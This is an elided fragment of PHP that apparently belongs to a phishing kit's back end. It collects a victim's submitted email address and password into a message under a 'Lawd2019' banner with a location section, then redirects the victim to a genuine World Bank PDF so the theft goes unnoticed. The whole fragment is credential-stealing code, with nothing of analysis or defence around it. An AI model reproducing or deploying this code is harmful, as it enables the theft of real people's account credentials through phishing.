...
$message .= "---------------Lawd2019-----------------------\n";
$message .= "Email Address (Again)             : ".$_POST['login']."\n";
$message .= "Password   (Again)           : ".$_POST['passwd']."\n";
$message .= "----------------------LOCATION--------------------------\n";
...
$login = $_POST['login'];
    header("Location: https://databank.worldbank.org/data/download/site-content/IDS-2018.pdf");
